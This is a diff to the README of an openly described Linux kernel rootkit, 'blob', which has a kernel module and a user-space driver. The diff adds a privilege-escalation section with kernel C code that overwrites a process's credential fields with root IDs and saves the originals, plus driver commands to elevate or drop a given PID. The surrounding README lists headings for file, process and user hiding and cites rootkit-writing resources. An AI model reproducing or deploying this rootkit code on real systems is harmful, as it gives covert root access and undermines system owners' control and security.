@@ -32,53 +32,53 @@ This module is composed of two components, the core and the driver. Each compone
 >The following commands assume that this project folder is the current directory.
 ### Core
 The core program is the Linux kernel module that will handle system call hooking and other operations in the kernel space. All of these commands should be ran in the *core* directory. 
->**You must have root privileges to run these commands**.
+>**You must have root privileges to run these installation commands**.
 
-    $ cd core
+    cd core
 
 #### Build
 
 To compile the module, run `make`
 
-    $ make
+    make
 
 #### Install
 
 To install the module, run `insmod`
 
-    $ insmod src/blob.ko  
+    insmod src/blob.ko  
 
 #### Build & Install
  This one-liner will build & install the module for us, provided by our Makefile.
 
-    $ make install
+    make install
 
 > **Note**: Our module loads with the name `blob` when displayed from `lsmod`.
 > 
 #### Uninstall 
 To uninstall the module, run `rmmod`
 
-    $ rmmod blob
+    rmmod blob
 
 #### Clean
 In the event that you need to re-compile our module, you can clean the compiled object and kernel-object files with this command.
 
-    $ make clean
+    make clean
 
 ### Driver
 The driver program is used to communicate to the core program from user space. This will interface the client and the core by accepting a series of command arguements. All of these commands should be ran in the *driver* directory. 
 
-    $ cd driver
+    cd driver
 
 #### Install
 Install the driver program using the C compiler.
 
-    $ cc syscall.c -o syscall
+    cc syscall.c -o syscall
 
 #### Uninstall
 To uninstall the driver program, delete it.
 
-    $ rm syscall
+    rm syscall
 
 ## Usage
 
@@ -103,6 +103,57 @@ Use the `driver` script to send remote commands to the module.
 ## File Hiding
 ## Process Hiding
 ## Process privilege escalation
+In Linux, a process structure is defined by the task_struct.
+
+Escalating processes is done by modifying a task_struct's credentials. This can be accomplished by overwriting the credentials struct within the task_struct.
+
+All of a task’s credentials are held in (uid, gid) or through (groups, keys, LSM security) a refcounted structure of type ‘struct cred’. Each task points to its credentials by a pointer called ‘cred’ in its task_struct.
+
+A credential's struct can be accessed within the task_struct
+
+    pcred = (struct cred *)task->cred;
+
+In order to escalate, we can set the credentials equal to root.
+
+    pcred->uid.val = 0;
+    pcred->suid.val = 0;
+    pcred->euid.val = 0;
+    pcred->fsuid.val = 0;
+    pcred->gid.val = 0;
+    pcred->sgid.val = 0;
+    pcred->egid.val = 0;
+    pcred->fsgid.val = 0;
+
+Our rootkit will also save the process's original credentials in a custom pid_node struct.
+
+    typedef struct pid_node {
+        pid_t 		pid;
+        kuid_t uid, suid, euid, fsuid;
+        kgid_t gid, sgid, egid, fsgid;
+        struct pid_node *prev, *next;
+    } PID_NODE;
+
+And back it up in case the user wants to drop the privileges.
+
+    new_node->uid = pcred->uid;
+    new_node->suid = pcred->suid;
+    new_node->euid = pcred->euid;
+    new_node->fsuid = pcred->fsuid;
+    new_node->gid = pcred->gid;
+    new_node->sgid = pcred->sgid;
+    new_node->egid = pcred->egid;
+    new_node->fsgid = pcred->fsgid;
+
+### Example
+Escalating a process with a PID 12345
+
+    ./driver elevate 12345
+Dropping the escalated process back to its original UID
+
+    ./driver drop 12345
+
+>**Note:** You may only drop processes you have escalated before.
+
 ## User hiding
 ## Hooking custom system calls 
 ### Extending the Base Code
@@ -141,6 +192,14 @@ and
   (this can be done by modifying the `INCLUDE_FIRST` definition in "./src/Kbuild")
 
 See "./include/test.h", "./src/test.Kbuild", and "test.Makefile" for full examples.
+## Sources
+Helpful resources used during the development of this project
+
+1. https://blog.trailofbits.com/2019/01/17/how-to-write-a-rootkit-without-really-trying/
+2. https://davejingtian.org/2019/02/25/syscall-hijacking-in-2019/
+3. https://www.kernel.org/doc/Documentation/security/credentials.txt
+4. https://github.com/torvalds/linux/blob/master/include/linux/sched.h
+
 
 ## License
 Copyright 2019. By collabrators
